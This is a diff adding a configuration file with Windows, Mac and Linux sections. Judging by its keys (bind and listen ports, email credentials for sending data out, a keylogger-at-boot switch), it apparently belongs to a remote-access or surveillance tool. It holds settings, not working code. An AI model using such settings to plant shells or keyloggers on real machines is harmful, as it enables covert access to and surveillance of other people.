@@ -1,0 +1,33 @@
+[Windows]
+bind = True
+bhost = 
+bport = 4433
+listen = True
+lhost = localhost
+lport = 4455
+email = None
+email_pwd = 
+keylogger_boot = False
+
+[Mac]
+bind = True
+bhost = 
+bport = 4433
+listen = True
+lhost = localhost
+lport = 4455
+email = None
+email_pwd = 
+keylogger_boot = False
+
+[Linux]
+bind = True
+bhost = 0.0.0.0
+bport = 4433
+listen = False
+lhost = 
+lport = 0
+email = None
+email_pwd = 
+keylogger_boot = False
+
